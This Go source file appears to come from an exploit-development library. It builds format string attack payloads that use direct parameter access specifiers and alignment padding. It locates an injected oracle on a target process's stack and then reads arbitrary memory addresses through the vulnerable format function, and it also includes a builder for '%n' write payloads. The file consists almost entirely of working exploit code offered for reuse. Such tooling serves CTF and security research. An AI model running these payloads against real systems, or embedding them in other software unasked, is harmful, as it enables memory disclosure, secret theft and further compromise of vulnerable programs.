package memory

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	mathrand "math/rand"
	"strconv"
)

type ProcessIO interface {
	WriteLine(p []byte) error
	ReadUntil(p []byte) ([]byte, error)
}

type FormatStringDPAConfig struct {
	ProcessIOFn  func() ProcessIO
	MaxNumParams int
	PointerSize  int
	Verbose      *log.Logger
}

func (o FormatStringDPAConfig) validate() error {
	if o.ProcessIOFn == nil {
		return fmt.Errorf("get process function cannot be nil")
	}

	if o.MaxNumParams <= 0 {
		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
	}

	if o.PointerSize <= 0 {
		return fmt.Errorf("pointer size in bytes must be greater than 0")
	}

	return nil
}

func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStringLeaker {
	f, err := SetupFormatStringLeakViaDPA(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
	}
	return f
}

func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
	setupConfig := dpaLeakSetupConfig{
		dpaConfig: config,
		builderAndMemAlignedLenFn: func() (formatStringBuilder, int) {
			builder := formatStringBuilder{
				prefixAndSuffix:  []byte("|"),
				endOfStringDelim: []byte("foozlefu"),
			}
			buff := bytes.NewBuffer(nil)
			builder.appendDPALeak(config.MaxNumParams, []byte("p"), buff)

			return builder, stringLenMemoryAligned(buff.Bytes(), config.PointerSize)
		},
	}

	dpaLeakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(setupConfig)
	if err != nil {
		return nil, err
	}

	return &FormatStringLeaker{
		procIOFn:  config.ProcessIOFn,
		builder:   dpaLeakConfig.builder,
		formatStr: dpaLeakConfig.builder.buildDPA(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
	}, nil
}

type dpaLeakSetupConfig struct {
	dpaConfig                 FormatStringDPAConfig
	builderAndMemAlignedLenFn func() (formatStringBuilder, int)
}

func createDPAFormatStringLeakWithLastValueAsArg(config dpaLeakSetupConfig) (*dpaLeakConfig, error) {
	err := config.dpaConfig.validate()
	if err != nil {
		return nil, err
	}

	oracle, err := randomStringOfCharsAndNums(config.dpaConfig.PointerSize)
	if err != nil {
		return nil, fmt.Errorf("failed to generate oracle string - %w", err)
	}

	invertedOracle := make([]byte, config.dpaConfig.PointerSize)
	for i := 0; i < config.dpaConfig.PointerSize; i++ {
		invertedOracle[i] = oracle[config.dpaConfig.PointerSize-i-1]
	}

	// TODO: Some platforms do not include '0x' in the format
	//  function's output.
	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))
	invertedFormattedOracle := []byte(fmt.Sprintf("0x%x", invertedOracle))

	if config.dpaConfig.Verbose != nil {
		config.dpaConfig.Verbose.Printf("formatted leak oracle: '%s' - invterted: '%s'",
			formattedOracle, invertedFormattedOracle)
	}

	fmtStrBuilder, memoryAlignedLen := config.builderAndMemAlignedLenFn()
	specifier := []byte{'p'}

	i := 0
	for ; i < config.dpaConfig.MaxNumParams; i++ {
		buff := bytes.NewBuffer(nil)
		fmtStrBuilder.appendDPALeak(i, specifier, buff)

		leakedValue, err := leakDataWithFormatString(
			config.dpaConfig.ProcessIOFn(),
			append(fmtStrBuilder.build(memoryAlignedLen, buff), oracle...),
			fmtStrBuilder)
		if err != nil {
			return nil, err
		}

		if bytes.Equal(leakedValue, formattedOracle) || bytes.Equal(leakedValue, invertedFormattedOracle) {
			return &dpaLeakConfig{
				paramNum: i,
				alignLen: memoryAlignedLen,
				builder:  fmtStrBuilder,
			}, nil
		}
	}

	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
}

type dpaLeakConfig struct {
	paramNum int
	alignLen int
	builder  formatStringBuilder
}

type formatStringBuilder struct {
	prefixAndSuffix  []byte
	endOfStringDelim []byte
}

// The resulting string is going to look like this:
//     [padding][format-string-with-loop-index][address]
//
// The "padding" is required because of the format
// string parameter specifier. As it grows, it could
// potentially mess up the alignment of the stack,
// which will make finding the oracle very difficult.
func (o formatStringBuilder) buildDPA(paramNumber int, specifiers []byte, alignmentLen int) []byte {
	temp := bytes.NewBuffer(nil)
	o.appendDPALeak(paramNumber, specifiers, temp)
	return o.build(alignmentLen, temp)
}

// %192p|%9$n|
func (o formatStringBuilder) appendDPAWrite(numBytes int, paramNum int, specifiers []byte, buff *bytes.Buffer) {
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(numBytes))
	buff.WriteByte('c')
	o.appendDPALeak(paramNum, specifiers, buff)
}

func (o formatStringBuilder) appendDPALeak(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
	o.appendPrefix(buff)
	buff.WriteByte('%')
	buff.WriteString(strconv.Itoa(paramNumber))
	buff.WriteByte('$')
	if len(specifiers) > 0 {
		buff.Write(specifiers)
	}
	o.appendSuffix(buff)
}

func (o formatStringBuilder) appendPrefix(buff *bytes.Buffer) {
	buff.Write(o.prefixAndSuffix)
}

func (o formatStringBuilder) appendSuffix(buff *bytes.Buffer) {
	buff.Write(o.prefixAndSuffix)
	buff.Write(o.endOfStringDelim)
}

func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
	return appendStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
}

func (o formatStringBuilder) isSuitableForLeaking() error {
	if len(o.prefixAndSuffix) == 0 {
		return fmt.Errorf("prefix and suffix field cannot be empty")
	}
	return nil
}

type FormatStringLeaker struct {
	formatStr []byte
	builder   formatStringBuilder
	procIOFn  func() ProcessIO
}

func (o FormatStringLeaker) FormatString() []byte {
	return o.formatStr
}

func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
	p, err := o.MemoryAt(pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer, err))
	}
	return p
}

func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
	return leakDataWithFormatString(o.procIOFn(), append(o.formatStr, pointer...), o.builder)
}

func NewFormatStringDPALeakerOrExit(config FormatStringDPAConfig) *FormatStringDPALeaker {
	res, err := NewFormatStringDPALeaker(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
	}
	return res
}

func NewFormatStringDPALeaker(config FormatStringDPAConfig) (*FormatStringDPALeaker, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	fmtStrBuilder := formatStringBuilder{
		prefixAndSuffix:  []byte("|"),
		endOfStringDelim: []byte("foozlefu"),
	}

	unalignedBuff := bytes.NewBuffer(nil)
	fmtStrBuilder.appendDPALeak(config.MaxNumParams, []byte("p"), unalignedBuff)

	return &FormatStringDPALeaker{
		config:     config,
		builder:    fmtStrBuilder,
		alignedLen: stringLenMemoryAligned(unalignedBuff.Bytes(), config.PointerSize),
	}, nil
}

type FormatStringDPALeaker struct {
	config     FormatStringDPAConfig
	builder    formatStringBuilder
	alignedLen int
}

func (o FormatStringDPALeaker) FindParamNumberOrExit(target []byte) (int, bool) {
	i, b, err := o.FindParamNumber(target)
	if err != nil {
		defaultExitFn(err)
	}
	return i, b
}

func (o FormatStringDPALeaker) FindParamNumber(target []byte) (int, bool, error) {
	for i := 0; i < o.config.MaxNumParams; i++ {
		result, err := o.MemoryAtParam(i)
		if err != nil {
			return 0, false, fmt.Errorf("failed to get memory at direct access param number %d - %w",
				i, err)
		}

		if o.config.Verbose != nil {
			o.config.Verbose.Printf("FindParamNumber read: '%s'", result)
		}

		if bytes.Equal(target, result) {
			if o.config.Verbose != nil {
				o.config.Verbose.Printf("FindParamNumber found target: '%s'", target)
			}
			return i, true, nil
		}
	}

	return 0, false, nil
}

func (o FormatStringDPALeaker) MemoryAtParamOrExit(paramNumber int) []byte {
	res, err := o.MemoryAtParam(paramNumber)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
	}
	return res
}

func (o FormatStringDPALeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
	if paramNumber > o.config.MaxNumParams {
		// This is a problem because it may potentially shift
		// the arguments on the stack, and make the result
		// of the format string function unpredictable.
		return nil, fmt.Errorf("requested parameter number %d exceeds maximum params of %d",
			paramNumber, o.config.MaxNumParams)
	}

	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.builder)
}

func (o FormatStringDPALeaker) FormatString(paramNum int) []byte {
	return o.builder.buildDPA(paramNum, []byte{'p'}, o.alignedLen)
}

// TODO: Support for retrieving multiple values.
//  E.g., |0x0000000000000001||0x0000000000000002|endstrdel
func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringBuilder) ([]byte, error) {
	err := info.isSuitableForLeaking()
	if err != nil {
		return nil, fmt.Errorf("format string is not suitable for leaking data - %w", err)
	}

	err = process.WriteLine(formatStr)
	if err != nil {
		return nil, fmt.Errorf("failed to write format string to process - %w", err)
	}

	token, err := process.ReadUntil(info.endOfStringDelim)
	if err != nil {
		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
	}

	firstSepIndex := bytes.Index(token, info.prefixAndSuffix)
	if firstSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
	}

	lineWithoutFirstSep := token[firstSepIndex+1:]
	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.prefixAndSuffix)
	if lastSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
	}

	return lineWithoutFirstSep[0:lastSepIndex], nil
}

// stringLenMemoryAligned calculates a (potentially) new length that the
// string should be stretched to given the corresponding pointer size.
//
// This is necessary because functions reads data in chunks that correspond
// to the platform's pointer size (e.g., 64-bit being 8 bytes). If a string
// is 9 bytes long, that 9th byte will be mixed in with other data.
//
// This problem can be circumvented by simply padding the string to a length
// that is divisible by the specified pointer size.
func stringLenMemoryAligned(stringWithoutPadding []byte, pointerSizeBytes int) int {
	maxStringLen := len(stringWithoutPadding)
	padLen := 0
	for {
		if (maxStringLen + padLen) % pointerSizeBytes == 0 {
			break
		}
		padLen++
	}
	return padLen + maxStringLen
}

func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
}

func appendStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(str, bytes.Repeat([]byte{c}, newLen-strLen)...)
}

func randomStringOfCharsAndNums(numChars int) ([]byte, error) {
	if numChars <= 0 {
		return nil, fmt.Errorf("number of random characters cannot be less than or equal to zero")
	}

	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

	rawRandom := make([]byte, 8)
	_, err := rand.Read(rawRandom)
	if err != nil {
		return nil, err
	}

	src := mathrand.NewSource(int64(binary.BigEndian.Uint64(rawRandom)))

	random := mathrand.New(src)

	result := make([]byte, numChars)
	for i := 0; i < numChars; i++ {
		result[i] = chars[random.Intn(len(chars))]
	}

	return result, nil
}
